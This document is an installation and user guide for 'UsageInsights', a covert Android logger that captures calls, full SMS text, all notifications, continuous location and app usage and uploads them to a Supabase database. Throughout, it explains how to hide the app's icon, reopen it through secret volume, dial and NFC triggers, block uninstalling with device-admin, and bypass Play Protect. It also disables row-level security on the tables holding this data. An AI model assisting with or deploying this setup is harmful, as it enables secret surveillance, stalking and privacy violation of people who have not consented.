# UsageInsights — Installation & User Guide

UsageInsights is a silent Android activity logger. It runs invisibly in the background, logs calls, SMS, notifications, location, app usage, and more to a local database, and syncs everything to your private Supabase project. There is no visible icon, no notification, and no trace in the recent apps list.

---

## Table of Contents

1. [Requirements](#1-requirements)
2. [Supabase Setup](#2-supabase-setup)
3. [Configure the App](#3-configure-the-app)
4. [Build & Install the APK](#4-build--install-the-apk)
5. [First Launch & Setup Wizard](#5-first-launch--setup-wizard)
6. [Grant Permissions](#6-grant-permissions)
7. [Set Your PIN](#7-set-your-pin)
8. [Configure Triggers](#8-configure-triggers)
9. [Accessing the App](#9-accessing-the-app)
10. [What Gets Logged](#10-what-gets-logged)
11. [Syncing Data](#11-syncing-data)
12. [Hiding the App Icon](#12-hiding-the-app-icon)
13. [Uninstall Protection](#13-uninstall-protection)
14. [Troubleshooting](#14-troubleshooting)

---

## 1. Requirements

| Requirement | Details |
|---|---|
| Android version | **9.0 (Pie) or higher** |
| Tested on | Android 9, Android 13 (Samsung Galaxy S20) |
| Tools to build | [Android Studio](https://developer.android.com/studio) (free) |
| Cloud backend | [Supabase](https://supabase.com) free account |
| Computer | Windows, macOS, or Linux to build the APK |

---

## 2. Supabase Setup

The app syncs all logs to a Supabase (PostgreSQL) database. You need to create the tables before the app can sync.

### 2.1 Create a Supabase project

1. Go to [supabase.com](https://supabase.com) and sign in.
2. Click **New project**.
3. Choose a name, set a strong database password, pick a region close to you, click **Create new project**.
4. Wait ~2 minutes for provisioning to finish.

### 2.2 Get your credentials

1. In your project dashboard, go to **Project Settings → API**.
2. Copy **Project URL** — looks like `https://xxxxxxxxxxxx.supabase.co`
3. Copy **anon / public key** — starts with `eyJ...` (legacy) or `sb_publishable_...` (newer projects)

You will paste these into the app in step 3.

### 2.3 Create the tables

Go to **SQL Editor** in your Supabase dashboard, paste the SQL below, and click **Run**.

```sql
create table call_logs (
  id bigserial primary key,
  number text,
  saved_name text,
  call_type text,
  duration_seconds integer,
  timestamp bigint
);

create table sms_logs (
  id bigserial primary key,
  sender text,
  saved_name text,
  content text,
  timestamp bigint
);

create table notification_logs (
  id bigserial primary key,
  package_name text,
  app_name text,
  title text,
  content text,
  timestamp bigint
);

create table location_logs (
  id bigserial primary key,
  latitude double precision,
  longitude double precision,
  accuracy double precision,
  position_status text,
  timestamp bigint
);

create table system_event_logs (
  id bigserial primary key,
  event_type text,
  detail text,
  timestamp bigint
);

create table screen_logs (
  id bigserial primary key,
  event_type text,
  timestamp bigint
);

create table battery_logs (
  id bigserial primary key,
  level integer,
  is_charging boolean,
  event_type text,
  timestamp bigint
);

create table app_usage_logs (
  id bigserial primary key,
  package_name text,
  app_name text,
  usage_duration_seconds integer,
  window_start bigint,
  window_end bigint
);

create table network_logs (
  id bigserial primary key,
  event_type text,
  detail text,
  timestamp bigint
);

create table error_logs (
  id bigserial primary key,
  error_type text,
  message text,
  stacktrace text,
  timestamp bigint
);
```

### 2.4 Disable Row Level Security (RLS)

By default Supabase blocks all writes from the anon key. For each table:

1. Go to **Table Editor**, click a table.
2. Click **RLS disabled** (or go to **Authentication → Policies**).
3. Make sure RLS is **disabled** on all 10 tables above, or create an INSERT policy for the `anon` role.

> **Quickest option:** run this in the SQL Editor to disable RLS on all tables at once:
> ```sql
> alter table call_logs disable row level security;
> alter table sms_logs disable row level security;
> alter table notification_logs disable row level security;
> alter table location_logs disable row level security;
> alter table system_event_logs disable row level security;
> alter table screen_logs disable row level security;
> alter table battery_logs disable row level security;
> alter table app_usage_logs disable row level security;
> alter table network_logs disable row level security;
> alter table error_logs disable row level security;
> ```

---

## 3. Configure the App

Open the project in Android Studio. Edit the file:

```
app/src/main/res/values/secrets.xml
```

Replace the placeholder values with your own:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="supabase_url">https://YOUR_PROJECT_ID.supabase.co</string>
    <string name="supabase_anon_key">eyJ...YOUR_ANON_KEY...</string>
    <string name="secret_dial_host">01234</string>
</resources>
```

| Field | Where to find it |
|---|---|
| `supabase_url` | Supabase → Project Settings → API → Project URL |
| `supabase_anon_key` | Supabase → Project Settings → API → anon public key |
| `secret_dial_host` | The digits of your dial trigger code — dialing `*#01234#` opens the app (Android ≤ 11 only, see §8) |

These values are **baked into the APK** as defaults. You can update the Supabase credentials at any time from inside the app (**App tab → SECURITY → Supabase Credentials**) without rebuilding — the in-app value takes precedence over `secrets.xml`.

> `secrets.xml` is git-ignored and never committed. It stays on your machine only.

---

## 4. Build & Install the APK

### 4.1 Build a signed release APK (recommended)

A signed release APK is smaller, optimised, and required if you ever need to update the app without reinstalling.

1. Open Android Studio → **Build → Generate Signed Bundle / APK → APK** → click **Next**.
2. Create a new keystore (or use an existing one):
   - **Keystore path** — choose a safe location outside the project folder
   - **Password** — use a strong password and store it somewhere safe
   - **Key alias & password** — can be the same as the keystore password
3. Select **release** as the build variant, click **Finish**.
4. When done, click **locate** in the notification — the APK is in `app/release/app-release.apk`.

> Keep your keystore file and both passwords safe. You need the same keystore to push updates to the installed app. If you lose it, you must uninstall and reinstall from scratch.

### 4.2 Build a debug APK (quick testing)

1. Go to **Build → Build Bundle(s) / APK(s) → Build APK(s)**.
2. APK is in `app/build/outputs/apk/debug/app-debug.apk`.

> Debug APKs are fine for testing but cannot be used to update a release-signed install.

### 4.3 Install on your phone

**Option A — USB (fastest):**
1. On the phone: **Settings → Developer Options → USB Debugging** (on).
2. Connect via USB and run:
   ```
   adb install app/release/app-release.apk
   ```

**Option B — File transfer:**
1. Copy the APK to the phone (USB, cloud drive, or messaging app).
2. On the phone: **Settings → Install unknown apps** → allow your file manager.
3. Open the APK file and tap **Install**.

> If Google Play Protect blocks the install, tap **Install anyway** or temporarily disable Play Protect in the Play Store settings.

---

## 5. First Launch & Setup Wizard

After installing, the app appears in your launcher as **Usage Insights** with a normal icon. Open it — you will see the **lock screen** (PIN entry). The default PIN is:

```
1 2 3 4 5 6
```

Enter it to reach the main interface. Immediately go to the **App tab** and change your PIN (see §7) before doing anything else.

Once inside, tap **Re-run Setup Wizard** on the App tab. It will open each required settings screen one by one.

---

## 6. Grant Permissions

All permissions must be granted for full logging. The **App tab** shows a badge (green = granted, orange = not granted) for each one.

| Permission | How to grant | What it logs |
|---|---|---|
| **Notification Access** | Settings → Notification access → enable Usage Insights | All notifications from all apps |
| **Location** | Settings → App permissions → Location → **Allow all the time** | GPS coordinates every 60 min |
| **Usage Stats** | Settings → Usage access → enable Usage Insights | Which apps are open and for how long |
| **Device Admin** | Activates uninstall protection | Prevents removal without going through the app |
| **Battery Optimization** | Settings → Battery → Don't optimize | Keeps the app alive in the background |

> On Android 13+, you may also be prompted to allow **notifications** — accept it even though the app doesn't show any, as some internal services require it.

---

## 7. Set Your PIN

The default PIN `123456` should be changed immediately.

1. Open the app (using the volume trigger or the launcher icon if still visible).
2. Enter your current PIN on the lock screen.
3. Go to the **App tab → SECURITY → Change PIN**.
4. Enter your current PIN, then your new 6-digit PIN twice.
5. Tap **Save**.

Once saved, the default PIN is permanently invalidated.

---

## 8. Configure Triggers

Triggers are how you re-open the app after hiding the launcher icon. Go to the **Trigger tab** to manage them.

### Volume button sequence (default, recommended)

The app opens when you press the volume buttons in this exact sequence:

```
Vol+  Vol+  Vol−  Vol+  Vol−  Vol−
```

Press them one at a time, within 3 seconds total. The accessibility service must be enabled for this to work:

1. On the Trigger tab, the **Volume Sequence** toggle will be ON by default.
2. A toast will remind you to enable it in Accessibility settings.
3. Go to **Settings → Accessibility → Installed services → Input Accessibility** → turn it on.

You only need to do this once. The sequence works from anywhere — lock screen, home screen, inside another app.

### Dial code (Android 9–11 only)

> **Note:** the dial code trigger does **not** work on Android 12 or higher due to OS restrictions. It is kept for older devices only.

Default code: `*#01234#`  
Type it in the phone dialer (do not press call). The app opens immediately.  
You can change the code from the Trigger tab.

### NFC tag

Tap a programmed NFC tag to open the app.

1. Enable the NFC toggle on the Trigger tab.
2. Tap **Write Tag** and hold an empty NFC tag to the back of your phone.
3. From then on, tapping that tag opens the lock screen.

---

## 9. Accessing the App

Once the launcher icon is hidden (§12), you access the app exclusively through your triggers.

| Method | How |
|---|---|
| Volume sequence | Vol+ Vol+ Vol− Vol+ Vol− Vol− (within 3 seconds) |
| NFC tag | Tap the programmed tag |
| Dial code (Android ≤ 11) | Type `*#01234#` in the phone dialer |

When triggered, the **lock screen** appears. Enter your 6-digit PIN to open the app.

> The app closes and disappears from recent apps **automatically** as soon as you navigate away — home button, back button, notifications, anything. You must re-enter your PIN to come back in.

---

## 10. What Gets Logged

| Category | What is captured |
|---|---|
| **Calls** | Number, saved contact name, type (incoming/outgoing/missed), duration, timestamp |
| **SMS** | Sender, saved contact name, full message content, timestamp |
| **Notifications** | App package, app name, notification title, content, timestamp |
| **Location** | Latitude, longitude, accuracy (meters), status (FIX / DISABLED), timestamp |
| **Screen** | Screen on, screen off, device unlocked — with timestamps |
| **Battery** | Level (%), charging state, event type (level update / plugged / unplugged), timestamp |
| **App Usage** | Package name, app name, time spent in app, session start and end timestamps |
| **Network** | WiFi connected/disconnected (with network name), mobile data on/off, timestamp |
| **System Events** | Device boot, shutdown, reboot, airplane mode toggle, timestamp |
| **Errors** | Sync failures with HTTP status code and Supabase error message |

---

## 11. Syncing Data

Go to the **Sync tab** to manage data upload.

### Test connection
Tap **Ping** to verify your Supabase credentials are correct. The badge turns green on success.

### Automatic sync
- **Every 12 hours** (default) — recommended
- **Every 24 hours** — for lower data usage
- **Manual only** — you control when it syncs

### Manual sync
Tap **Sync Now** to push all pending logs immediately. Useful after first setup to confirm everything works.

### After a successful sync
All local data is wiped after a confirmed successful upload. Your Supabase tables are the permanent record.

### Sync log
Tap **View Log** to see errors from the last sync attempts. Each entry shows the date, time, error type, and the exact message from Supabase (e.g. `HTTP 403: RLS policy violation`).

---

## 12. Hiding the App Icon

Once everything is set up and working:

1. Open the app → **App tab → VISIBILITY → Show Launcher Icon** → toggle **OFF**.
2. The icon disappears from the launcher immediately.
3. From now on, use a trigger (volume sequence, NFC, or dial code) to open the app.

> You can toggle the icon back on at any time from inside the app.

---

## 13. Uninstall Protection

Activating **Device Admin** prevents the app from being uninstalled normally. If someone goes to Settings → Apps → Usage Insights → Uninstall, they will see a message saying the app is protected by a device administrator.

To uninstall the app legitimately:
1. Open the app via a trigger.
2. Enter your PIN.
3. Go to **App tab → DANGER ZONE → Deactivate Device Admin**.
4. Then uninstall normally from Settings → Apps.

Alternatively, **Disable & Reset App** wipes all local data and preferences, returning the app to its initial state.

---

## 14. Troubleshooting

**App not opening with volume sequence**
- Make sure the accessibility service is enabled: Settings → Accessibility → Input Accessibility → ON.
- Press the buttons one at a time, not too fast. You have 3 seconds for the full sequence.
- The sequence is: Vol+ Vol+ Vol− Vol+ Vol− Vol−

**Sync fails with HTTP 401 or 403**
- Your anon key is wrong, or RLS is blocking inserts. Re-check §2.4 and §3.

**Sync fails with "Could not find column"**
- The Supabase table schema doesn't match. Re-run the SQL from §2.3.

**Location always shows DISABLED**
- Location permission must be set to **Allow all the time** (not just while using). Re-check §6.

**App not logging notifications**
- Notification access must be granted separately from regular permissions. Go to Settings → Notification access.

**Play Protect blocks installation**
- Tap **Install anyway**, or go to Play Store → Profile → Play Protect → temporarily disable it.

**App disappears after installing (no icon)**
- The icon may have been hidden. Dial `*#01234#` in the phone dialer (Android ≤ 11) or use the volume sequence to open it.

**PIN forgotten**
- There is no recovery mechanism. You must uninstall and reinstall (requires deactivating Device Admin first via Settings → Security → Device admin apps → deactivate).
